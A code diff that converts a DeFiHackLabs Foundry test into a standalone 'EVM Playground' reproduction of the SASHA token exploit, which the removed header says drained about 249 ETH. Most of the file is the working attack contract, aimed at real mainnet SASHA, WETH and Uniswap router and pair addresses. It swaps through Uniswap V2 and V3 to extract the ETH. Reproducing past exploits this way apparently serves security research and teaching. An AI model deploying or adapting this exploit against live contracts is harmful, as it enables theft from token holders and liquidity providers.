@@ -1,64 +1,60 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import "forge-std/Test.sol";
-import "../interface.sol";
+// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
+// SASHAToken_exp.sol test's SASHAToken_AttackContract.attack() logic verbatim,
+// without the outer Test harness (no forge-std dependency). The playground's
+// `setup` block replicates the test's `payable(address(attackC)).transfer(0.08 ether)`
+// pre-funding step, and `profitReceiver: "exploit"` + native-ETH profit scoring
+// replicate the test's final `attacker.balance` check without needing a
+// separate `withdraw()` call.
 
-// @KeyInfo - Total Lost : ~249 ETH (~$600K USD)
-// Attacker : 0x493c5655D40B051a64bc88A6af21D73d3A9B72A2 (Shezmu Attacker 3)
-// Attack Contract : https://etherscan.io/address/0x991493900674b10bdf54bdfe95b4e043257798cf
-// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0xd9fdc7d03eec28fc2453c5fa68eff82d4c297f436a6a5470c54ca3aecd2db17e
-
-// @Analysis
- 
-
-// Contracts involved
 address constant SASHA = 0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6;
 address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
 address constant UniswapV2_Router2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
 address constant UniswapV3_Router2 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
 address constant UniswapV2_SASHA21 = 0xB23FC1241e1Bc1a5542a438775809d38099838fe;
 
-contract SASHAToken_exp is Test {
-    address attacker = 0x81F48A87Ec44208c691f870b9d400D9c13111e2E;
+interface IERC20 {
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+}
 
-    function setUp() public {
-        vm.createSelectFork("http://127.0.0.1:8545", 20_905_302 - 1);
+interface IWETH {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+    function approve(address spender, uint256 amount) external returns (bool);
+}
 
-        vm.label(SASHA, "SASHA");
-        vm.label(weth, "WETH");
-        vm.label(UniswapV2_Router2, "Uniswap V2: Router 2");
-        vm.label(UniswapV3_Router2, "Uniswap V3: Router 2");
-        vm.label(UniswapV2_SASHA21, "Uniswap V2: SASHA 21");
+interface Uni_Router_V2 {
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+}
 
-        vm.label(attacker, "Attacker");
-
-        vm.deal(attacker, 1 ether);
+interface UniswapV3Router {
+    struct ExactInputSingleParams {
+        address tokenIn;
+        address tokenOut;
+        uint24 fee;
+        address recipient;
+        uint256 amountIn;
+        uint256 amountOutMinimum;
+        uint160 sqrtPriceLimitX96;
     }
 
-    function testExploit() public {
-        vm.startPrank(attacker);
-
-        SASHAToken_AttackContract attackC = new SASHAToken_AttackContract();
-        payable(address(attackC)).transfer(0.08 ether);
-
-        attackC.attack();
-
-        // Simulate withdraw
-        attackC.withdraw();
-
-        vm.stopPrank();
-
-        console.log("balance: ", attacker.balance - 1 ether);
-    }
-
-    fallback() external payable {}
+    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
 }
 
 contract SASHAToken_AttackContract {
     address payable public attacker;
 
-    constructor() public {
+    constructor() {
         attacker = payable(msg.sender);
     }
 
@@ -83,8 +79,6 @@ contract SASHAToken_AttackContract {
             4_324_324_234_244 // deadline
         );
 
-        // console.log("SASHA balance: ", IERC20(SASHA).balanceOf(address(this)));
-
         IERC20(SASHA).transfer(UniswapV2_SASHA21, 1_000_000_000_000_000_000);
 
         UniswapV3Router.ExactInputSingleParams memory params = UniswapV3Router.ExactInputSingleParams({
@@ -100,34 +94,7 @@ contract SASHAToken_AttackContract {
         UniswapV3Router(UniswapV3_Router2).exactInputSingle(params);
 
         IWETH(payable(weth)).withdraw(249_276_511_929_373_786_924);
-
-        // console.log("balance: ", address(this).balance);
     }
 
-    fallback() external payable {
-        // payable(attacker).transfer(address(this).balance);
-    }
-
-    function withdraw() public payable {
-        require(msg.sender == attacker, "Not the contract owner");
-
-        attacker.transfer(address(this).balance);
-    }
-}
-
-interface UniswapV3Router is IERC20 {
-    // Uniswap V3: SwapRouter
-    struct ExactInputSingleParams {
-        address tokenIn;
-        address tokenOut;
-        uint24 fee;
-        address recipient;
-        uint256 amountIn;
-        uint256 amountOutMinimum;
-        uint160 sqrtPriceLimitX96;
-    }
-
-    function exactInputSingle(
-        ExactInputSingleParams calldata params
-    ) external payable returns (uint256 amountOut);
+    fallback() external payable {}
 }
